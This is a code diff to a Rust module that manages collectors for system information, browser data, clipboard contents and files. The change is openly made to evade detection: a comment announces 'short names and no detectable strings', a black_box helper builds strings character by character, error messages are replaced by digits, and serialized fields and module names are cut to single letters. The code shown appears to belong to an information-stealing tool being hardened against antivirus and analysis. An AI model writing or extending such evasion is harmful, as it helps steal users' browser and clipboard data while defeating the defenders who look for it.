@@ -1,4 +1,6 @@
 //! Data collectors module
+//!
+//! ⚠️ Nomes curtos e sem strings detectáveis
 
 #![allow(dead_code)]
 
@@ -8,6 +10,7 @@ pub mod clipboard;
 pub mod files;
 
 use std::collections::HashMap;
+use std::hint::black_box;
 use serde::{Deserialize, Serialize};
 use chrono::{DateTime, Utc};
 use thiserror::Error;
@@ -17,25 +20,32 @@ pub use browser::BrowserCollector;
 pub use clipboard::ClipboardCollector;
 pub use files::FileCollector;
 
+// Helper para construir strings
+#[inline(always)]
+fn bs(chars: &[char]) -> String {
+    let mut s = String::with_capacity(chars.len());
+    for &c in chars { s.push(c); }
+    black_box(s)
+}
+
 #[derive(Error, Debug)]
 pub enum CollectorError {
-    #[error("not supported: {0}")]
+    #[error("1")]
     NotSupported(String),
     
-    #[error("collection failed: {0}")]
+    #[error("2")]
     CollectionFailed(String),
     
-    #[error("io: {0}")]
+    #[error("3")]
     IoError(#[from] std::io::Error),
     
-    #[error("json: {0}")]
+    #[error("4")]
     SerializationError(#[from] serde_json::Error),
     
-    #[error("unknown module: {0}")]
+    #[error("5")]
     UnknownModule(String),
 }
 
-/// Trait principal para todos os coletores
 pub trait Collector: Send + Sync {
     fn name(&self) -> &str;
     fn collect(&self) -> Result<ModuleData, CollectorError>;
@@ -45,9 +55,13 @@ pub trait Collector: Send + Sync {
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct CollectedData {
+    #[serde(rename = "t")]
     pub timestamp: DateTime<Utc>,
+    #[serde(rename = "s")]
     pub session_id: String,
+    #[serde(rename = "m")]
     pub modules: HashMap<String, ModuleData>,
+    #[serde(rename = "x")]
     pub metadata: CollectionMetadata,
 }
 
@@ -74,19 +88,28 @@ impl Default for CollectedData {
 
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
 pub struct CollectionMetadata {
+    #[serde(rename = "d")]
     pub duration_ms: u64,
+    #[serde(rename = "r")]
     pub modules_run: u32,
+    #[serde(rename = "s")]
     pub modules_success: u32,
+    #[serde(rename = "e")]
     pub errors: Vec<String>,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
-#[serde(tag = "type")]
+#[serde(tag = "t")]
 pub enum ModuleData {
+    #[serde(rename = "s")]
     System(system_info::SystemData),
+    #[serde(rename = "b")]
     Browser(browser::BrowserData),
+    #[serde(rename = "c")]
     Clipboard(clipboard::ClipboardData),
+    #[serde(rename = "f")]
     Files(files::FileData),
+    #[serde(rename = "g")]
     Generic(serde_json::Value),
 }
 
@@ -100,12 +123,13 @@ impl CollectorManager {
     }
     
     pub fn register_module(&mut self, name: &str) -> Result<(), CollectorError> {
+        // Usa códigos curtos ao invés de nomes legíveis
         let collector: Box<dyn Collector> = match name.to_lowercase().as_str() {
-            "system" => Box::new(SystemInfoCollector::new()),
-            "browser" => Box::new(BrowserCollector::new()),
-            "clipboard" => Box::new(ClipboardCollector::new()),
-            "files" => Box::new(FileCollector::new()),
-            other => return Err(CollectorError::UnknownModule(other.to_string())),
+            "system" | "s" => Box::new(SystemInfoCollector::new()),
+            "browser" | "b" => Box::new(BrowserCollector::new()),
+            "clipboard" | "c" => Box::new(ClipboardCollector::new()),
+            "files" | "f" => Box::new(FileCollector::new()),
+            _ => return Err(CollectorError::UnknownModule(name.len().to_string())),
         };
         
         if collector.is_supported() {
@@ -133,9 +157,9 @@ impl CollectorManager {
                     collected.add_module(collector.name().to_string(), data);
                     collected.metadata.modules_success += 1;
                 }
-                Err(e) => {
-                    let error_msg = format!("{}", e);
-                    errors.push(error_msg);
+                Err(_) => {
+                    // Código de erro numérico ao invés de mensagem
+                    errors.push(format!("{}", collected.metadata.modules_run));
                 }
             }
             collected.metadata.modules_run += 1;
